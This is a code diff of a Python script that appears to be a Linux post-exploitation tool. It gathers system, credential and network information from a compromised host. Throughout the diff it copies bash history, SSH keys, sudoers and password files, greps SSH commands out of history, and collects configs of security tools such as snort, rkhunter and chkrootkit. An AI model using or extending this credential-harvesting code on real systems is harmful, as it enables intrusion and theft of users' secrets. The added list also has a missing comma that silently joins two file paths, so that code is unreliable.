@@ -189,6 +189,11 @@ def Gather_OS():
    os.system("find /home -type f -iname '.*history' > HistoryList.txt")
    os.system("cat /proc/cpuinfo > cpuinfo.txt")
    os.system("cat /proc/meminfo > meminfo.txt")
+
+   if os.path.exists(Home_Dir+"/.bash_history") is True:
+        shutil.copy2(Home_Dir+"/.bash_history", "bash_history.txt")
+   if os.path.exists(Home_Dir+"/.viminfo") is True:
+       shutil.copy2(Home_Dir+"/.viminfo", "viminfo")
    
    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
    content = ''
@@ -200,11 +205,8 @@ def Gather_OS():
    os.mkdir("users/")
    os.chdir("users/")
    
-   file = open("CurrentUser.txt" ,"a")
-   file.write("\n\nHome Directory: "+ Home_Dir+"\n\n")
-   file.close()
-   os.system("ls -alhR ~/ > userhome.txt")
-   os.system("ls -alhR /home > allusers.txt")
+   os.system("ls -alhR ~/ > CurrentUser.txt")
+   os.system("ls -alhR /home > AllUsers.txt")
    
    
 def GetCredentials():
@@ -217,6 +219,7 @@ def GetCredentials():
     os.system("lastlog > lastlog.txt")
     os.system("last -a > last.txt")
     os.system("getent aliases > mail_aliases.txt")
+    
 
     os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
     os.system("ls /home/*/.ssh/* > ssh_contents.txt")    
@@ -226,6 +229,7 @@ def GetCredentials():
        content = content + '\n' + open(f).read()
     open('SSH_Locations.txt','wb').write(content)
     os.system("rm ssh_locations.txt ssh_contents.txt")
+    os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")
 
 
     credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
@@ -235,8 +239,6 @@ def GetCredentials():
     	if os.path.exists(x) is True:
     		shutil.copy2(x, Temp_Dir+"/credentials/")
 
-    if os.path.exists(Home_Dir+"/.bash_history") is True:
-        shutil.copy2(Home_Dir+"/.bash_history", Temp_Dir+"/credentials/bash_history.txt")
 
 
 def NetworkInfo():
@@ -274,14 +276,10 @@ def NetworkInfo():
    open('NetworkInfo.txt','wb').write(content)
    os.system("rm localIP.txt hostname.txt ifconfig.txt")
 
-   if os.path.exists("/etc/hosts.deny") is True:
-       shutil.copy2("/etc/hosts.deny", networkdir)
-   if os.path.exists("/etc/hosts.allow") is True:
-       shutil.copy2("/etc/hosts.allow", networkdir)
-   if os.path.exists("/etc/inetd.conf") is True:
-       shutil.copy2("/etc/inetd.conf", networkdir)
-   if os.path.exists("/etc/host.conf") is True:
-   	shutil.copy2("/etc/host.conf", networkdir)
+   network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
+   for x in network:
+       if os.path.exists(x) is True:
+           shutil.copy2(x, networkdir)
    
                
 def NetworkMap():
@@ -361,11 +359,14 @@ def FindProtect():
     os.chdir(protectiondir)
     os.mkdir(Config_Dir)
 
+
     configs = [ "/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf",
                 "/etc/bitlbee/bitlbee.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf",
                 "/etc/security/access.conf", "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/apt/secring.gpg",
                 "/etc/apt/trusted.gpg", "/etc/nginx/nginx.conf", "/etc/shells", "/etc/gated.conf", "/etc/inetd.conf", "/etc/rpc",
-                "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf" ]
+                "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf"
+                "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf", "/opt/lampp/etc/httpd.conf", "/etc/cups/cups.conf",
+                "/etc/exports", "/etc/fstab" ]
 
     for x in configs:
         if os.path.exists(x) is True:
